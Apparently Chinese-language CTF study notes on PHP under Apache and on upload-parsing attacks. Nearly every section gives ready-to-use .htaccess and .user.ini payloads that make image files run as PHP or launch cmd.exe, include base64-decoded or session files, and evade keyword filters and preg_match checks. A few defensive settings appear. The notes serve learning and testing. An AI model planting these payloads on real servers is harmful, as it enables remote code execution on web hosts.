# apache
php常见运行方式有 apache的模块模式(分为mod_php和mod_cgi) cgi`模式,`fast-cgi模式
  1. cgi模式就是建立在多进程上的, 但是cgi的每一次请求都会有启动和退出的过程(fork-and-execute模式, 启动脚本解析器解析php.ini 初始化运行环境, 载入dll), 这在高并发时性能非常弱.
  2. fast-cgi就是为了解决cgi的问题而诞生的, web server 启动时 会启动fastcgi进程管理器, fastcgi进程管理器读取php.ini文件并初始化, 然后启动多个cgi解释器进程(php-cgi), 当收到请求时,web server会将相关数据发送到fastcgi的子进程 php-cgi中处理.
  3. apache模块模式
    * mod_php模式, apache调用与php相关模块(apache内置), 将php当做apache子模块运行. apache每收到一个请求就会启动一个进程并通过sapi(php和外部通信的接口)来连接php
    * mod_cgi/mod_fcgid模式 使用cgi或者fast-cgi实现.
> 而php版本分为nts(None-Thread Safe) 和 ts(Thread Safe),
> 在windows中创建线程更为快捷,而在linux中创建进程更快捷,在nts版本下 fast-cgi拥有更好的性能所以windows下经常采用fast-> cgi方式解析php. 所以在nts版本里面是没有mod_php (phpxapachexxx.dll)模块的.
    AddHandler:
        AddHandler php5-script .jpg
        AddHandler   fcgid-script .jpg
        在文件扩展名与特定处理器之间建立映射
    Addtype:
        AddType application/x-httpd-php .jpg
## 1\. 多名后缀
如：
    flag.php.aaa  就会解析为php文件
其中php文件后缀
    ".+\.ph(p[345]?|t|tml)\."
    php,php3,php4,php5,pht,phtml都会当成php文件执行
## 2`.htaccess`
> 修改`.htaccess`的文件名`修改apache下的conf文件的AccessFileName .htaccess`
作用
> .htaccess文件可以配置很多事情，如 **是否开启站点的图片缓存** 、 **自定义错误页面** 、 **自定义默认文档** 、
> **设置WWW域名重定向** 、 **设置网页重定向** 、 **设置图片防盗链和访问权限控制**
> 。但我们这里只关心.htaccess文件的一个作用——MIME类型修改。
### 生效条件(php解析, 命令执行)
在`CGI/FastCGI`模式下 (在phpinfo中的Server API查看)
`.htaccess`文件配置
  1. 将jpg后缀文件解析为php文件
    AddHandler   fcgid-script .jpg
    FcgidWrapper "G:/11111111gongju/phpstudy_pro/Extensions/php/php7.0.9nts/php-cgi.exe" .jpg
    将php-cgi.exe路径改为对应的php版本即可
  1. 执行命令(此方法下我无法解析php了)
AddHandler添加某一特殊文件后缀作为cgi程序
        .htaccess
    Options +ExecCGI
    AddHandler cgi-script .jpg
    test.jpg
    #!C:/Windows/System32/cmd.exe /c start notepad
    test
    必须要有两排数据 第二排随意
    方法二:
    打开任意文件执行命令
    Options +ExecCGI(如果配置文件中有则不用添加)
    AddHandler   fcgid-script .jpg
    FcgidWrapper "C:/Windows/System32/cmd.exe /c start calc.exe" .jpg
> 这与apache的conf/vhosts文件夹中的配置相同, 这个文件夹可以在单个ip创建不同域名的配置文件.
  1. 使用`SetHandler`将目录下所有文件视为cgi程序
    SetHandler cgi-script
    或者
    SetHandler   fcgid-script
    FcgidWrapper "C:/Windows/System32/cmd.exe /c start calc.exe
    不需要添加后缀
  1. 使用相对路径
> 无法使用绝对路径是可以利用一下
在handler模式下
    1. 配置文件中在对应目录下 如: /var/www/html添加  AllowOverride All
    windows下Apache要加载mod_Rewrite模块，配置文件上写上：LoadModule rewrite_module /usr/lib/apache2/modules/mod_rewrite.so
    重启apache
    1. AddType application/x-httpd-php .xxx 
       AddHandler application/x-httpd-php .xxx    将xxx后缀作为php解析
    2. SetHandler application/x-httpd-php 将该目录下所有文件及其子文件中的文件当做php解析
    3.  
        SetHandler application/x-httpd-php
    该语句会让Apache把.jpg文件解析为php文件。
  * 防御方法
修改匹配规则
    SetHandler application/x-httpd-php
禁止.php.这样的文件执行
    Require all denied
`.htaccess包含文件`
    php_value auto_prepend_file "test.jpg" 文件开始插入
    php_value auto_append_file "test.jpg"  文件结束插入
    利用伪协议 
    php_value auto_prepend_file php://filter/convert.base64-decode/resource=test.jpg
    test.jpg  
### 其他利用方式
查看apache服务器信息
    SetHandler server-status
绕过preg_math
    设置回溯限制
     pcre.backtrack_limit给pcre设定了一个回溯次数上限，默认为1000000，如果回溯次数超过这个数字，preg_match会返回false,在,htaccess中手动修改这个限制
    php_value pcre.backtrack_limit 0
    php_value pcre.jit 0
使`.htaccess`可以访问
    编辑.htaccess
        Require all granted
        Order allow,deny
        Allow from all
将`.htaccess`作为shell
        Require all granted
        Order allow,deny
        Allow from all
    SetHandler application/x-httpd-php
    #
    注意#号
### 绕过
    反斜线绕过
    SetHa\
    ndler appli\
    cation/x-ht\
    tpd-php
    文件中不能包含某些关键字符
    上传base加密的文件
    利用php_value auto_prepend_file包含文件时base解密
    包含session文件
    php_value auto_append_file "/tmp/sess_session文件名"
    php_value session.save_path "/tmp"  # session文件储存位置
    php_flag session.upload_progress.cleanup off # session上传进度
## 3\. `.use.ini`
> `.usr.ini`不只是nginx专有的, 只要是以 fastcgi 方式运行php的 都能够使用(apache/nginx/iis),
> 作用相当于可以自定义的`php.ini`文件
    auto_prepend_file=123.jpg 文件前包含
    auto_append_file = 123.jpg文件后包含
让目录下的所有php文件自动包含`123.jpg`文件
## 4\. 目录遍历
`httpd.conf`下
    Options+Indexes+FollowSymLinks +ExecCGI   改为   Options-Indexes+FollowSymLinks +ExecCGI
# nginx